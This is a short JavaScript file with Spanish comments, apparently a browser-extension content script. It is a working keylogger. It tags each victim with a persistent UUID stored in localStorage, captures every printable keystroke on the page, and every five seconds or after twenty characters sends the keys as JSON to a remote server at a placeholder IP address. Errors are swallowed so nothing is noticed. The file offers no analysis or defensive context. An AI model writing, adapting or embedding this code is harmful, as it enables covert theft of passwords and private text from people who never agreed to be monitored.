(function() {
  let keyLogs = '';

  // Genera UUIDv4 simple y persistente
  function generarUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  let uuid = window.localStorage.getItem('uuid_extension');
  if (!uuid) {
    uuid = generarUUID();
    window.localStorage.setItem('uuid_extension', uuid);
  }

  document.addEventListener('keydown', (event) => {
    // Filtrar teclas no imprimibles o irrelevantes
    const key = event.key;

    // Ignorar teclas como Shift, Control, Alt, Meta, CapsLock, etc.
    const ignorar = ['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Dead'];
    if (ignorar.includes(key)) return;

    // Convertir Enter y Space para mejor legibilidad
    if (key === 'Enter') {
      keyLogs += '\n';
    } else if (key === 'Backspace') {
      // Opcional: registrar un símbolo para borrar, o eliminar última tecla grabada
      keyLogs += '[BKS]';
    } else if (key === ' ') {
      keyLogs += ' ';
    } else {
      keyLogs += key;
    }

    if (keyLogs.length >= 20) {
      enviarKeylogs();
    }
  });

  setInterval(() => {
    if (keyLogs.length > 0) {
      enviarKeylogs();
    }
  }, 5000);

  function enviarKeylogs() {
    fetch('http://<IP>:5000/api/recibir', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        tipo: 'keylogger',
        datos: { keys: keyLogs },
        timestamp: new Date().toISOString(),
        uuid: uuid
      })
    }).catch(() => {
      // Error ignorado
    });

    keyLogs = '';
  }
})();

